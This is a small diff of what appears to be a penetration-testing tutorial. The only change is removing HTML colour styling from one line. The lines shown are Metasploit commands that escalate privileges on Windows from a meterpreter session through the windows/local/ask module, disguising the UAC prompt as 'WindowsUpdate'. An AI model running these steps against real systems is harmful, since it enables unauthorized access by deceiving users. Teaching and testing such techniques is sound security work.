@@ -10,7 +10,7 @@ meterpreter> background
 exploit (multi/handler)> search uac
 use exploit/windows/local/ask
 
-exploit <span style="color:red;">(windows/local/ask)</span> > set FILE_NAME WindowsUpdate
+exploit (windows/local/ask) > set FILE_NAME WindowsUpdate
 exploit (windows/local/ask)> session 1
 exploit (windows/local/ask)> technique PSH
 exploit (windows/local/ask)> run
